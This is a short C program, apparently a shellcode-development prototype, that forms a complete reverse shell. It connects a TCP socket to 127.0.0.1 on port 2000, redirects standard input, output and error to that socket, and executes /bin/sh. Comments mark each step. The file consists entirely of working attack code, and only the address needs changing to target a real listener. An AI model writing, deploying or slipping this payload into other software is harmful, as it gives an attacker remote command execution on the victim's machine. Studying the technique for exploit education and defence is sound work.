#define _GNU_SOURCE
#include <sys/socket.h>
#include <arpa/inet.h>
#include <unistd.h>
#include <string.h>

int main() {
    // socket()
    int fd = socket(AF_INET, SOCK_STREAM, 0);

    struct sockaddr_in sa;
    memset(&sa, 0, sizeof(sa)); 

    sa.sin_family = AF_INET;          
    sa.sin_port = htons(2000);        
     sa.sin_addr.s_addr = inet_addr("127.0.0.1");

    // connect()   
    connect(fd, (struct sockaddr *)&sa, sizeof(sa));

    // dup2(fd, 0), dup2(fd,1), dup2(fd,2)
    dup2(fd, 0);
    dup2(fd, 1);
    dup2(fd, 2);

    // execve("/bin/sh", NULL, NULL)
    char *argv[] = {"/bin/sh", NULL};
    execve("/bin/sh", argv, NULL);

    return 0;
}
